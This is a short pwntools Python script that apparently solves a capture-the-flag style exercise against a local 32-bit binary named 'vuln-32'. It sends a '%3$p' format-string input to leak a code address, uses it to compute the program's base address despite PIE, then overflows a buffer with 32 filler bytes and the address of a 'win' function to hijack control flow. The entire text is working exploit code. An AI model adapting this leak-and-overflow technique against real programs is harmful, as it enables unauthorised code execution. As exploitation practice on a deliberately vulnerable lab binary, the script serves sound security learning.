from pwn import *
elf = context.binary = ELF("./vuln-32")
p = process()
offset = 32
p.sendline("%3$p")
p.recvuntil(b"Nice to meet you ")
vuln_12_leak = int(p.recvline().strip().decode(),16)
vuln_12_offset = elf.sym['vuln'] + 12
elf.address = vuln_12_leak - vuln_12_offset
win = p32(elf.sym['win'])
payload = b"A" * offset + win + p32(0x0)
p.sendline(payload)
print(p.recvall().strip().decode())